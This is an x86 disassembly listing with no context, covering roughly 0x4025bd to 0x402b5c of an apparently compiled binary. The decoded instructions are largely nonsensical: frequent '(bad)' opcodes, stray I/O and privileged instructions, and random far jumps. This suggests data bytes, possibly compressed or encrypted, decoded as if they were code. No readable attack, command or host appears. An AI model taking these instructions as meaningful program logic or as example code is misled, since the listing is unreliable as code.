  4025bd:	83 75 7d ab          	xorl   $0xffffffab,0x7d(%ebp)
  4025c1:	d9 22                	fldenv (%edx)
  4025c3:	b6 bb                	mov    $0xbb,%dh
  4025c5:	30 b1 7f 8e 06 1c    	xor    %dh,0x1c068e7f(%ecx)
  4025cb:	51                   	push   %ecx
  4025cc:	82 23 63             	andb   $0x63,(%ebx)
  4025cf:	c7                   	(bad)
  4025d0:	a9 db d0 1e 4a       	test   $0x4a1ed0db,%eax
  4025d5:	ec                   	in     (%dx),%al
  4025d6:	54                   	push   %esp
  4025d7:	18 5e 10             	sbb    %bl,0x10(%esi)
  4025da:	8a 85 c5 42 b8 e5    	mov    -0x1a47bd3b(%ebp),%al
  4025e0:	be cb fa ca 21       	mov    $0x21cafacb,%esi
  4025e5:	c0 bd 8c 80 06 ca 89 	sarb   $0x89,-0x35f97f74(%ebp)
  4025ec:	db 48 8c             	fisttpl -0x74(%eax)
  4025ef:	55                   	push   %ebp
  4025f0:	4b                   	dec    %ebx
  4025f1:	4f                   	dec    %edi
  4025f2:	ff 88 23 3c 7e 66    	decl   0x667e3c23(%eax)
  4025f8:	da 12                	ficoml (%edx)
  4025fa:	e2 ea                	loop   0x4025e6
  4025fc:	0e                   	push   %cs
  4025fd:	cd 08                	int    $0x8
  4025ff:	db 38                	fstpt  (%eax)
  402601:	fe                   	(bad)
  402602:	21 e2                	and    %esp,%edx
  402604:	d2 44 7d bb          	rolb   %cl,-0x45(%ebp,%edi,2)
  402608:	bb bb df 92 0e       	mov    $0xe92dfbb,%ebx
  40260d:	2a 80 14 c4 1e 9d    	sub    -0x62e13bec(%eax),%al
  402613:	5a                   	pop    %edx
  402614:	7e 81                	jle    0x402597
  402616:	18 4b e2             	sbb    %cl,-0x1e(%ebx)
  402619:	59                   	pop    %ecx
  40261a:	db d2                	fcmovnbe %st(2),%st
  40261c:	d8 74 62 25          	fdivs  0x25(%edx,%eiz,2)
  402620:	c9                   	leave
  402621:	66 bd 16 af          	mov    $0xaf16,%bp
  402625:	89 e6                	mov    %esp,%esi
  402627:	db 9f 31 8c d6 f2    	fistpl -0xd2973cf(%edi)
  40262d:	6f                   	outsl  %ds:(%esi),(%dx)
  40262e:	4e                   	dec    %esi
  40262f:	06                   	push   %es
  402630:	6c                   	insb   (%dx),%es:(%edi)
  402631:	68 b3 53 5d fa       	push   $0xfa5d53b3
  402636:	28 a8 d3 ce 38 fa    	sub    %ch,-0x5c7312d(%eax)
  40263c:	c7                   	(bad)
  40263d:	af                   	scas   %es:(%edi),%eax
  40263e:	e3 bf                	jecxz  0x4025ff
  402640:	43                   	inc    %ebx
  402641:	aa                   	stos   %al,%es:(%edi)
  402642:	af                   	scas   %es:(%edi),%eax
  402643:	7e d3                	jle    0x402618
  402645:	76 c4                	jbe    0x40260b
  402647:	06                   	push   %es
  402648:	2b f2                	sub    %edx,%esi
  40264a:	96                   	xchg   %eax,%esi
  40264b:	f0 fc                	lock cld
  40264d:	95                   	xchg   %eax,%ebp
  40264e:	2d a9 87 66 0a       	sub    $0xa6687a9,%eax
  402653:	71 f6                	jno    0x40264b
  402655:	37                   	aaa
  402656:	b2 b0                	mov    $0xb0,%dl
  402658:	fc                   	cld
  402659:	7d 69                	jge    0x4026c4
  40265b:	ef                   	out    %eax,(%dx)
  40265c:	e0 9a                	loopne 0x4025f8
  40265e:	02 6e f3             	add    -0xd(%esi),%ch
  402661:	88 67 59             	mov    %ah,0x59(%edi)
  402664:	5d                   	pop    %ebp
  402665:	b9 be 14 2d 38       	mov    $0x382d14be,%ecx
  40266a:	d9 05 07 b8 ff d3    	flds   0xd3ffb807
  402670:	13 a6 34 b1 0c c8    	adc    -0x37f34ecc(%esi),%esp
  402676:	0e                   	push   %cs
  402677:	2e 8d                	cs lea (bad),%ecx
  402679:	ce                   	into
  40267a:	16                   	push   %ss
  40267b:	cc                   	int3
  40267c:	1f                   	pop    %ds
  40267d:	28 8f f7 4b 8a 79    	sub    %cl,0x798a4bf7(%edi)
  402683:	b6 fd                	mov    $0xfd,%dh
  402685:	92                   	xchg   %eax,%edx
  402686:	5f                   	pop    %edi
  402687:	a2 5c 9a 71 74       	mov    %al,0x74719a5c
  40268c:	35 a2 88 6a fe       	xor    $0xfe6a88a2,%eax
  402691:	ef                   	out    %eax,(%dx)
  402692:	fd                   	std
  402693:	62                   	(bad)
  402694:	f4                   	hlt
  402695:	9f                   	lahf
  402696:	92                   	xchg   %eax,%edx
  402697:	ff 13                	call   *(%ebx)
  402699:	b9 2a 3c ff dd       	mov    $0xddff3c2a,%ecx
  40269e:	b3 3e                	mov    $0x3e,%bl
  4026a0:	04 ae                	add    $0xae,%al
  4026a2:	2c 02                	sub    $0x2,%al
  4026a4:	17                   	pop    %ss
  4026a5:	7f 68                	jg     0x40270f
  4026a7:	54                   	push   %esp
  4026a8:	59                   	pop    %ecx
  4026a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4026aa:	85 45 3f             	test   %eax,0x3f(%ebp)
  4026ad:	ef                   	out    %eax,(%dx)
  4026ae:	2f                   	das
  4026af:	19 33                	sbb    %esi,(%ebx)
  4026b1:	c1 7a 8f bb          	sarl   $0xbb,-0x71(%edx)
  4026b5:	e1 c5                	loope  0x40267c
  4026b7:	4b                   	dec    %ebx
  4026b8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4026b9:	5d                   	pop    %ebp
  4026ba:	f8                   	clc
  4026bb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4026bc:	62 70 90             	bound  %esi,-0x70(%eax)
  4026bf:	f6 0b 23             	testb  $0x23,(%ebx)
  4026c2:	55                   	push   %ebp
  4026c3:	cc                   	int3
  4026c4:	8d 40 e5             	lea    -0x1b(%eax),%eax
  4026c7:	1f                   	pop    %ds
  4026c8:	7c cb                	jl     0x402695
  4026ca:	33 be 2a ab 4e a1    	xor    -0x5eb154d6(%esi),%edi
  4026d0:	1e                   	push   %ds
  4026d1:	07                   	pop    %es
  4026d2:	a0 c2 6c c5 44       	mov    0x44c56cc2,%al
  4026d7:	34 33                	xor    $0x33,%al
  4026d9:	fa                   	cli
  4026da:	81 18 15 26 a4 e9    	sbbl   $0xe9a42615,(%eax)
  4026e0:	0d e7 df 43 cb       	or     $0xcb43dfe7,%eax
  4026e5:	58                   	pop    %eax
  4026e6:	dc 83 74 8d 51 85    	faddl  -0x7aae728c(%ebx)
  4026ec:	42                   	inc    %edx
  4026ed:	82 e3 4c             	and    $0x4c,%bl
  4026f0:	d9 88 ab dc d8 29    	(bad) 0x29d8dcab(%eax)
  4026f6:	1f                   	pop    %ds
  4026f7:	64 d7                	xlat   %fs:(%ebx)
  4026f9:	64 e9 c3 74 79 bf    	fs jmp 0xbfb99bc2
  4026ff:	22 45 73             	and    0x73(%ebp),%al
  402702:	4d                   	dec    %ebp
  402703:	f1                   	int1
  402704:	59                   	pop    %ecx
  402705:	97                   	xchg   %eax,%edi
  402706:	b1 5a                	mov    $0x5a,%cl
  402708:	bd f1 ee fb 45       	mov    $0x45fbeef1,%ebp
  40270d:	53                   	push   %ebx
  40270e:	08 df                	or     %bl,%bh
  402710:	37                   	aaa
  402711:	2b 71 00             	sub    0x0(%ecx),%esi
  402714:	96                   	xchg   %eax,%esi
  402715:	dd f7                	(bad)
  402717:	71 8f                	jno    0x4026a8
  402719:	20 3d 56 2a 4e 5f    	and    %bh,0x5f4e2a56
  40271f:	36 0e                	ss push %cs
  402721:	17                   	pop    %ss
  402722:	9b                   	fwait
  402723:	81 ee a8 8e c1 8d    	sub    $0x8dc18ea8,%esi
  402729:	bf 63 d9 5b aa       	mov    $0xaa5bd963,%edi
  40272e:	94                   	xchg   %eax,%esp
  40272f:	b3 7f                	mov    $0x7f,%bl
  402731:	b1 66                	mov    $0x66,%cl
  402733:	1a d1                	sbb    %cl,%dl
  402735:	b0 4b                	mov    $0x4b,%al
  402737:	dc 7d ac             	fdivrl -0x54(%ebp)
  40273a:	1b 4c 7e 30          	sbb    0x30(%esi,%edi,2),%ecx
  40273e:	1b 45 4d             	sbb    0x4d(%ebp),%eax
  402741:	93                   	xchg   %eax,%ebx
  402742:	17                   	pop    %ss
  402743:	3e 2c fa             	ds sub $0xfa,%al
  402746:	7d 98                	jge    0x4026e0
  402748:	d6                   	salc
  402749:	19 af 39 5e 7b a9    	sbb    %ebp,-0x5684a1c7(%edi)
  40274f:	1d 50 53 34 3f       	sbb    $0x3f345350,%eax
  402754:	af                   	scas   %es:(%edi),%eax
  402755:	05 82 af a8 48       	add    $0x48a8af82,%eax
  40275a:	bd 92 43 76 42       	mov    $0x42764392,%ebp
  40275f:	75 27                	jne    0x402788
  402761:	3f                   	aas
  402762:	f7 bf 07 d1 8f fe    	idivl  -0x1702ef9(%edi)
  402768:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402769:	e7 23                	out    %eax,$0x23
  40276b:	17                   	pop    %ss
  40276c:	74 d2                	je     0x402740
  40276e:	75 f3                	jne    0x402763
  402770:	98                   	cwtl
  402771:	d9 87 a7 15 27 84    	flds   -0x7bd8ea59(%edi)
  402777:	1b 96 d4 db 8b 97    	sbb    -0x6874242c(%esi),%edx
  40277d:	58                   	pop    %eax
  40277e:	89 82 66 bb 80 79    	mov    %eax,0x7980bb66(%edx)
  402784:	45                   	inc    %ebp
  402785:	22 0a                	and    (%edx),%cl
  402787:	d7                   	xlat   %ds:(%ebx)
  402788:	ef                   	out    %eax,(%dx)
  402789:	41                   	inc    %ecx
  40278a:	d3 77 77             	shll   %cl,0x77(%edi)
  40278d:	a3 5c 16 6b 7b       	mov    %eax,0x7b6b165c
  402792:	ef                   	out    %eax,(%dx)
  402793:	7e e8                	jle    0x40277d
  402795:	d2 c2                	rol    %cl,%dl
  402797:	12 fe                	adc    %dh,%bh
  402799:	2f                   	das
  40279a:	60                   	pusha
  40279b:	b2 4c                	mov    $0x4c,%dl
  40279d:	9e                   	sahf
  40279e:	fb                   	sti
  40279f:	ab                   	stos   %eax,%es:(%edi)
  4027a0:	73 6f                	jae    0x402811
  4027a2:	92                   	xchg   %eax,%edx
  4027a3:	0d 04 18 41 19       	or     $0x19411804,%eax
  4027a8:	94                   	xchg   %eax,%esp
  4027a9:	09 ff                	or     %edi,%edi
  4027ab:	37                   	aaa
  4027ac:	bd 4f 53 14 97       	mov    $0x9714534f,%ebp
  4027b1:	10 4b c5             	adc    %cl,-0x3b(%ebx)
  4027b4:	49                   	dec    %ecx
  4027b5:	cf                   	iret
  4027b6:	38 25 f5 9d ae b3    	cmp    %ah,0xb3ae9df5
  4027bc:	4f                   	dec    %edi
  4027bd:	7f bb                	jg     0x40277a
  4027bf:	c7                   	(bad)
  4027c0:	55                   	push   %ebp
  4027c1:	c3                   	ret
  4027c2:	54                   	push   %esp
  4027c3:	8b d2                	mov    %edx,%edx
  4027c5:	96                   	xchg   %eax,%esi
  4027c6:	fd                   	std
  4027c7:	7a f7                	jp     0x4027c0
  4027c9:	95                   	xchg   %eax,%ebp
  4027ca:	71 b7                	jno    0x402783
  4027cc:	b0 f8                	mov    $0xf8,%al
  4027ce:	ef                   	out    %eax,(%dx)
  4027cf:	7a da                	jp     0x4027ab
  4027d1:	f9                   	stc
  4027d2:	8a 09                	mov    (%ecx),%cl
  4027d4:	0a 97 7d 31 07 58    	or     0x5807317d(%edi),%dl
  4027da:	0a f8                	or     %al,%bh
  4027dc:	45                   	inc    %ebp
  4027dd:	5f                   	pop    %edi
  4027de:	3c 40                	cmp    $0x40,%al
  4027e0:	42                   	inc    %edx
  4027e1:	cd 6d                	int    $0x6d
  4027e3:	4d                   	dec    %ebp
  4027e4:	e5 00                	in     $0x0,%eax
  4027e6:	38 37                	cmp    %dh,(%edi)
  4027e8:	95                   	xchg   %eax,%ebp
  4027e9:	7d 45                	jge    0x402830
  4027eb:	8a 29                	mov    (%ecx),%ch
  4027ed:	09 0f                	or     %ecx,(%edi)
  4027ef:	52                   	push   %edx
  4027f0:	b0 3c                	mov    $0x3c,%al
  4027f2:	04 92                	add    $0x92,%al
  4027f4:	1c f6                	sbb    $0xf6,%al
  4027f6:	f3 62 0a             	repz bound %ecx,(%edx)
  4027f9:	c4 7e a9             	les    -0x57(%esi),%edi
  4027fc:	f9                   	stc
  4027fd:	b9 14 65 10 ea       	mov    $0xea106514,%ecx
  402802:	0f c9                	bswap  %ecx
  402804:	ef                   	out    %eax,(%dx)
  402805:	bc a0 e0 81 a1       	mov    $0xa181e0a0,%esp
  40280a:	3c 97                	cmp    $0x97,%al
  40280c:	a9 5e aa b8 f3       	test   $0xf3b8aa5e,%eax
  402811:	25 44 5e 7b 2e       	and    $0x2e7b5e44,%eax
  402816:	27                   	daa
  402817:	77 42                	ja     0x40285b
  402819:	e0 d6                	loopne 0x4027f1
  40281b:	31 4f 8f             	xor    %ecx,-0x71(%edi)
  40281e:	d7                   	xlat   %ds:(%ebx)
  40281f:	a1 ba e7 89 d1       	mov    0xd189e7ba,%eax
  402824:	de 1a                	ficomps (%edx)
  402826:	18 0b                	sbb    %cl,(%ebx)
  402828:	8b c4                	mov    %esp,%eax
  40282a:	38 c2                	cmp    %al,%dl
  40282c:	bd ce 35 89 df       	mov    $0xdf8935ce,%ebp
  402831:	4a                   	dec    %edx
  402832:	b7 ef                	mov    $0xef,%bh
  402834:	4d                   	dec    %ebp
  402835:	f9                   	stc
  402836:	ac                   	lods   %ds:(%esi),%al
  402837:	5b                   	pop    %ebx
  402838:	06                   	push   %es
  402839:	c7                   	(bad)
  40283a:	3f                   	aas
  40283b:	c7                   	(bad)
  40283c:	29 83 ce 06 0c 34    	sub    %eax,0x340c06ce(%ebx)
  402842:	f3 f4                	repz hlt
  402844:	f6 1a                	negb   (%edx)
  402846:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402847:	60                   	pusha
  402848:	9b                   	fwait
  402849:	c9                   	leave
  40284a:	f7 d0                	not    %eax
  40284c:	c0 17 1b             	rclb   $0x1b,(%edi)
  40284f:	f7 0c 4e fb 99 83 0e 	testl  $0xe8399fb,(%esi,%ecx,2)
  402856:	73 aa                	jae    0x402802
  402858:	39 68 ec             	cmp    %ebp,-0x14(%eax)
  40285b:	6e                   	outsb  %ds:(%esi),(%dx)
  40285c:	68 b7 96 dd cb       	push   $0xcbdd96b7
  402861:	57                   	push   %edi
  402862:	d4 10                	aam    $0x10
  402864:	e7 20                	out    %eax,$0x20
  402866:	b3 36                	mov    $0x36,%bl
  402868:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402869:	ec                   	in     (%dx),%al
  40286a:	f3 fb                	repz sti
  40286c:	d4 ef                	aam    $0xef
  40286e:	a8 57                	test   $0x57,%al
  402870:	e7 6a                	out    %eax,$0x6a
  402872:	10 4d 6a             	adc    %cl,0x6a(%ebp)
  402875:	09 73 99             	or     %esi,-0x67(%ebx)
  402878:	1f                   	pop    %ds
  402879:	e5 84                	in     $0x84,%eax
  40287b:	05 42 ab 8d 46       	add    $0x468dab42,%eax
  402880:	3f                   	aas
  402881:	04 a6                	add    $0xa6,%al
  402883:	5d                   	pop    %ebp
  402884:	13 43 5f             	adc    0x5f(%ebx),%eax
  402887:	94                   	xchg   %eax,%esp
  402888:	9c                   	pushf
  402889:	ec                   	in     (%dx),%al
  40288a:	b2 0e                	mov    $0xe,%dl
  40288c:	d3 9a d7 34 25 6d    	rcrl   %cl,0x6d2534d7(%edx)
  402892:	bd c6 94 16 0f       	mov    $0xf1694c6,%ebp
  402897:	51                   	push   %ecx
  402898:	86 57 fd             	xchg   %dl,-0x3(%edi)
  40289b:	8c 1a                	mov    %ds,(%edx)
  40289d:	cb                   	lret
  40289e:	be 94 85 47 1c       	mov    $0x1c478594,%esi
  4028a3:	b0 ff                	mov    $0xff,%al
  4028a5:	b6 67                	mov    $0x67,%dh
  4028a7:	62 1d 15 af 39 f6    	bound  %ebx,0xf639af15
  4028ad:	1c 75                	sbb    $0x75,%al
  4028af:	9d                   	popf
  4028b0:	20 a4 b2 7e 62 6b 0e 	and    %ah,0xe6b627e(%edx,%esi,4)
  4028b7:	b3 7b                	mov    $0x7b,%bl
  4028b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4028ba:	5a                   	pop    %edx
  4028bb:	22 63 ab             	and    -0x55(%ebx),%ah
  4028be:	b6 7b                	mov    $0x7b,%dh
  4028c0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4028c1:	3e 66 65 39 6a 1a    	ds cmp %bp,%gs:0x1a(%edx)
  4028c7:	d2 ae 34 74 b3 4a    	shrb   %cl,0x4ab37434(%esi)
  4028cd:	1c aa                	sbb    $0xaa,%al
  4028cf:	14 c0                	adc    $0xc0,%al
  4028d1:	6a 87                	push   $0xffffff87
  4028d3:	15 a5 1e 41 47       	adc    $0x47411ea5,%eax
  4028d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d9:	b3 e2                	mov    $0xe2,%bl
  4028db:	ea cc 14 2d 0d ff 57 	ljmp   $0x57ff,$0xd2d14cc
  4028e2:	84 13                	test   %dl,(%ebx)
  4028e4:	e7 20                	out    %eax,$0x20
  4028e6:	30 a1 c8 28 6b 77    	xor    %ah,0x776b28c8(%ecx)
  4028ec:	0f 5e 10             	divps  (%eax),%xmm2
  4028ef:	74 ec                	je     0x4028dd
  4028f1:	bf 9e 84 3a 6d       	mov    $0x6d3a849e,%edi
  4028f6:	36 0f 92 d5          	ss setb %ch
  4028fa:	26 68 5c 4c 1d e4    	es push $0xe41d4c5c
  402900:	01 43 0a             	add    %eax,0xa(%ebx)
  402903:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402904:	72 f8                	jb     0x4028fe
  402906:	40                   	inc    %eax
  402907:	12 31                	adc    (%ecx),%dh
  402909:	79 09                	jns    0x402914
  40290b:	c9                   	leave
  40290c:	4a                   	dec    %edx
  40290d:	ba 9a ad a7 93       	mov    $0x93a7ad9a,%edx
  402912:	42                   	inc    %edx
  402913:	53                   	push   %ebx
  402914:	ba 44 e6 dc 19       	mov    $0x19dce644,%edx
  402919:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40291a:	9c                   	pushf
  40291b:	28 e5                	sub    %ah,%ch
  40291d:	38 ea                	cmp    %ch,%dl
  40291f:	51                   	push   %ecx
  402920:	40                   	inc    %eax
  402921:	11 21                	adc    %esp,(%ecx)
  402923:	33 60 37             	xor    0x37(%eax),%esp
  402926:	ea de e1 54 24 a9 70 	ljmp   $0x70a9,$0x2454e1de
  40292d:	17                   	pop    %ss
  40292e:	d4 a1                	aam    $0xa1
  402930:	67 88 27             	mov    %ah,(%bx)
  402933:	c3                   	ret
  402934:	53                   	push   %ebx
  402935:	95                   	xchg   %eax,%ebp
  402936:	f5                   	cmc
  402937:	4e                   	dec    %esi
  402938:	b6 a5                	mov    $0xa5,%dh
  40293a:	70 ba                	jo     0x4028f6
  40293c:	6d                   	insl   (%dx),%es:(%edi)
  40293d:	16                   	push   %ss
  40293e:	b8 32 1f 7a cd       	mov    $0xcd7a1f32,%eax
  402943:	c2 fe e4             	ret    $0xe4fe
  402946:	d1 c6                	rol    $1,%esi
  402948:	10 81 ec da cc 49    	adc    %al,0x49ccdaec(%ecx)
  40294e:	34 d3                	xor    $0xd3,%al
  402950:	25 46 02 6f 03       	and    $0x36f0246,%eax
  402955:	6d                   	insl   (%dx),%es:(%edi)
  402956:	a1 1a 29 e5 49       	mov    0x49e5291a,%eax
  40295b:	66 fe                	data16 (bad)
  40295d:	6a ca                	push   $0xffffffca
  40295f:	90                   	nop
  402960:	59                   	pop    %ecx
  402961:	39 d6                	cmp    %edx,%esi
  402963:	61                   	popa
  402964:	7c 77                	jl     0x4029dd
  402966:	85 1c fa             	test   %ebx,(%edx,%edi,8)
  402969:	76 cc                	jbe    0x402937
  40296b:	e0 f7                	loopne 0x402964
  40296d:	3e 8f                	ds (bad)
  40296f:	df 84 b2 fc 58 7d bb 	filds  -0x4482a704(%edx,%esi,4)
  402976:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402977:	9d                   	popf
  402978:	cb                   	lret
  402979:	d7                   	xlat   %ds:(%ebx)
  40297a:	72 d0                	jb     0x40294c
  40297c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40297d:	3e 73 7a             	jae,pt 0x4029fa
  402980:	29 a4 2d 01 17 0d 96 	sub    %esp,-0x69f2e8ff(%ebp,%ebp,1)
  402987:	0f 38 a1             	(bad)
  40298a:	87 c0                	xchg   %eax,%eax
  40298c:	2d 76 82 4a 1e       	sub    $0x1e4a8276,%eax
  402991:	d1 c6                	rol    $1,%esi
  402993:	ef                   	out    %eax,(%dx)
  402994:	89 f4                	mov    %esi,%esp
  402996:	64 c6                	fs (bad)
  402998:	bf f2 fa b3 9a       	mov    $0x9ab3faf2,%edi
  40299d:	92                   	xchg   %eax,%edx
  40299e:	85 ce                	test   %ecx,%esi
  4029a0:	69 6c ef 9e 95 9f 44 	imul   $0x58449f95,-0x62(%edi,%ebp,8),%ebp
  4029a7:	58 
  4029a8:	1a 89 79 02 11 67    	sbb    0x67110279(%ecx),%cl
  4029ae:	4a                   	dec    %edx
  4029af:	06                   	push   %es
  4029b0:	b5 fb                	mov    $0xfb,%ch
  4029b2:	b7 96                	mov    $0x96,%bh
  4029b4:	9c                   	pushf
  4029b5:	f2 69 fb 0e 53 0c 39 	repnz imul $0x390c530e,%ebx,%edi
  4029bc:	9a 46 34 1c 7d 2d 89 	lcall  $0x892d,$0x7d1c3446
  4029c3:	06                   	push   %es
  4029c4:	41                   	inc    %ecx
  4029c5:	c8 ae b2 53          	enter  $0xb2ae,$0x53
  4029c9:	d6                   	salc
  4029ca:	5c                   	pop    %esp
  4029cb:	9a 4c 8f 35 a8 70 6d 	lcall  $0x6d70,$0xa8358f4c
  4029d2:	09 b9 f8 3c 53 41    	or     %edi,0x41533cf8(%ecx)
  4029d8:	3a c7                	cmp    %bh,%al
  4029da:	d7                   	xlat   %ds:(%ebx)
  4029db:	c9                   	leave
  4029dc:	ea 47 bf f3 93 93 80 	ljmp   $0x8093,$0x93f3bf47
  4029e3:	dc bd f7 f7 95 36    	fdivrl 0x3695f7f7(%ebp)
  4029e9:	b2 34                	mov    $0x34,%dl
  4029eb:	40                   	inc    %eax
  4029ec:	2e 8f 05 55 e6 3b 73 	pop    %cs:0x733be655
  4029f3:	d4 bf                	aam    $0xbf
  4029f5:	32 3c 39             	xor    (%ecx,%edi,1),%bh
  4029f8:	27                   	daa
  4029f9:	71 a8                	jno    0x4029a3
  4029fb:	6c                   	insb   (%dx),%es:(%edi)
  4029fc:	b3 6e                	mov    $0x6e,%bl
  4029fe:	e5 60                	in     $0x60,%eax
  402a00:	04 54                	add    $0x54,%al
  402a02:	44                   	inc    %esp
  402a03:	44                   	inc    %esp
  402a04:	7a de                	jp     0x4029e4
  402a06:	d7                   	xlat   %ds:(%ebx)
  402a07:	4e                   	dec    %esi
  402a08:	e3 de                	jecxz  0x4029e8
  402a0a:	90                   	nop
  402a0b:	05 49 4d 91 c0       	add    $0xc0914d49,%eax
  402a10:	9a 9d db e2 4f 20 1a 	lcall  $0x1a20,$0x4fe2db9d
  402a17:	7f 53                	jg     0x402a6c
  402a19:	ef                   	out    %eax,(%dx)
  402a1a:	fc                   	cld
  402a1b:	05 03 70 e2 31       	add    $0x31e27003,%eax
  402a20:	ac                   	lods   %ds:(%esi),%al
  402a21:	bb 46 1a d6 1f       	mov    $0x1fd61a46,%ebx
  402a26:	3b d1                	cmp    %ecx,%edx
  402a28:	4f                   	dec    %edi
  402a29:	da 50 7d             	ficoml 0x7d(%eax)
  402a2c:	47                   	inc    %edi
  402a2d:	b7 9c                	mov    $0x9c,%bh
  402a2f:	90                   	nop
  402a30:	ff 63 4c             	jmp    *0x4c(%ebx)
  402a33:	13 d8                	adc    %eax,%ebx
  402a35:	5a                   	pop    %edx
  402a36:	c7                   	(bad)
  402a37:	74 40                	je     0x402a79
  402a39:	99                   	cltd
  402a3a:	29 ab cc 96 f6 9e    	sub    %ebp,-0x61096934(%ebx)
  402a40:	1d 7c d3 80 93       	sbb    $0x9380d37c,%eax
  402a45:	06                   	push   %es
  402a46:	86 8c fc 06 49 41 62 	xchg   %cl,0x62414906(%esp,%edi,8)
  402a4d:	75 d6                	jne    0x402a25
  402a4f:	01 4c 3a 57          	add    %ecx,0x57(%edx,%edi,1)
  402a53:	21 68 48             	and    %ebp,0x48(%eax)
  402a56:	c1 bd 6c 17 b9 42 1c 	sarl   $0x1c,0x42b9176c(%ebp)
  402a5d:	98                   	cwtl
  402a5e:	a3 6e c5 e3 04       	mov    %eax,0x4e3c56e
  402a63:	58                   	pop    %eax
  402a64:	ef                   	out    %eax,(%dx)
  402a65:	47                   	inc    %edi
  402a66:	c6                   	(bad)
  402a67:	0e                   	push   %cs
  402a68:	68 02 34 38 62       	push   $0x62383402
  402a6d:	df 57 df             	fists  -0x21(%edi)
  402a70:	10 ac f1 c7 aa 74 d8 	adc    %ch,-0x278b5539(%ecx,%esi,8)
  402a77:	92                   	xchg   %eax,%edx
  402a78:	c7                   	(bad)
  402a79:	2a 39                	sub    (%ecx),%bh
  402a7b:	e4 84                	in     $0x84,%al
  402a7d:	95                   	xchg   %eax,%ebp
  402a7e:	3b d5                	cmp    %ebp,%edx
  402a80:	20 07                	and    %al,(%edi)
  402a82:	8f                   	(bad)
  402a83:	be ac 35 4a db       	mov    $0xdb4a35ac,%esi
  402a88:	1d 0f 10 f6 90       	sbb    $0x90f6100f,%eax
  402a8d:	b0 cb                	mov    $0xcb,%al
  402a8f:	1f                   	pop    %ds
  402a90:	7b ef                	jnp    0x402a81
  402a92:	f9                   	stc
  402a93:	e6 e0                	out    %al,$0xe0
  402a95:	48                   	dec    %eax
  402a96:	13 04 7a             	adc    (%edx,%edi,2),%eax
  402a99:	c0 0a 81             	rorb   $0x81,(%edx)
  402a9c:	35 c0 5a ae d7       	xor    $0xd7ae5ac0,%eax
  402aa1:	1d 3e 89 09 70       	sbb    $0x7009893e,%eax
  402aa6:	81 57 a9 0b ef 75 71 	adcl   $0x7175ef0b,-0x57(%edi)
  402aad:	16                   	push   %ss
  402aae:	1b 3d 39 75 ad 81    	sbb    0x81ad7539,%edi
  402ab4:	99                   	cltd
  402ab5:	bc db c8 94 08       	mov    $0x894c8db,%esp
  402aba:	95                   	xchg   %eax,%ebp
  402abb:	19 d4                	sbb    %edx,%esp
  402abd:	42                   	inc    %edx
  402abe:	09 ed                	or     %ebp,%ebp
  402ac0:	47                   	inc    %edi
  402ac1:	2e 4a                	cs dec %edx
  402ac3:	fc                   	cld
  402ac4:	c1 5f 1b 41          	rcrl   $0x41,0x1b(%edi)
  402ac8:	27                   	daa
  402ac9:	31 dd                	xor    %ebx,%ebp
  402acb:	22 ad c2 df 75 b5    	and    -0x4a8a203e(%ebp),%ch
  402ad1:	17                   	pop    %ss
  402ad2:	b5 2e                	mov    $0x2e,%ch
  402ad4:	e8 78 ee a3 b5       	call   0xb5e41951
  402ad9:	f7 09 e4 6e f3 17    	testl  $0x17f36ee4,(%ecx)
  402adf:	e0 b4                	loopne 0x402a95
  402ae1:	24 c1                	and    $0xc1,%al
  402ae3:	e4 dd                	in     $0xdd,%al
  402ae5:	67 c3                	addr16 ret
  402ae7:	84 c4                	test   %al,%ah
  402ae9:	96                   	xchg   %eax,%esi
  402aea:	ab                   	stos   %eax,%es:(%edi)
  402aeb:	b3 8a                	mov    $0x8a,%bl
  402aed:	25 dd 6b 5a bd       	and    $0xbd5a6bdd,%eax
  402af2:	1a e1                	sbb    %cl,%ah
  402af4:	5a                   	pop    %edx
  402af5:	53                   	push   %ebx
  402af6:	cc                   	int3
  402af7:	26 fa                	es cli
  402af9:	5e                   	pop    %esi
  402afa:	71 a2                	jno    0x402a9e
  402afc:	8c 52 c3             	mov    %ss,-0x3d(%edx)
  402aff:	d5 9f                	aad    $0x9f
  402b01:	a9 07 1a bb dc       	test   $0xdcbb1a07,%eax
  402b06:	8d                   	lea    (bad),%ebx
  402b07:	d9 1a                	fstps  (%edx)
  402b09:	79 47                	jns    0x402b52
  402b0b:	39 85 6c fb a3 ce    	cmp    %eax,-0x315c0494(%ebp)
  402b11:	3d 6f 72 65 ab       	cmp    $0xab65726f,%eax
  402b16:	b8 e9 ee 26 a3       	mov    $0xa326eee9,%eax
  402b1b:	66 d0 41 f3          	data16 rolb $1,-0xd(%ecx)
  402b1f:	1c 83                	sbb    $0x83,%al
  402b21:	91                   	xchg   %eax,%ecx
  402b22:	66 43                	inc    %bx
  402b24:	ce                   	into
  402b25:	6f                   	outsl  %ds:(%esi),(%dx)
  402b26:	80 3d 22 c0 67 f1 a3 	cmpb   $0xa3,0xf167c022
  402b2d:	49                   	dec    %ecx
  402b2e:	9a 38 0d e4 d5 1e 77 	lcall  $0x771e,$0xd5e40d38
  402b35:	79 90                	jns    0x402ac7
  402b37:	3c 82                	cmp    $0x82,%al
  402b39:	99                   	cltd
  402b3a:	4e                   	dec    %esi
  402b3b:	80 db 7b             	sbb    $0x7b,%bl
  402b3e:	7e 13                	jle    0x402b53
  402b40:	bc d3 da 0f 45       	mov    $0x450fdad3,%esp
  402b45:	1b 59 75             	sbb    0x75(%ecx),%ebx
  402b48:	53                   	push   %ebx
  402b49:	df 03                	filds  (%ebx)
  402b4b:	77 9e                	ja     0x402aeb
  402b4d:	90                   	nop
  402b4e:	b4 f8                	mov    $0xf8,%ah
  402b50:	bf f4 35 a8 1c       	mov    $0x1ca835f4,%edi
  402b55:	b3 60                	mov    $0x60,%bl
  402b57:	23 16                	and    (%esi),%edx
  402b59:	47                   	inc    %edi
  402b5a:	7e 8c                	jle    0x402ae8
  402b5c:	28 9f 14 00 bc 9c    	sub    %bl,-0x6343ffec(%edi)
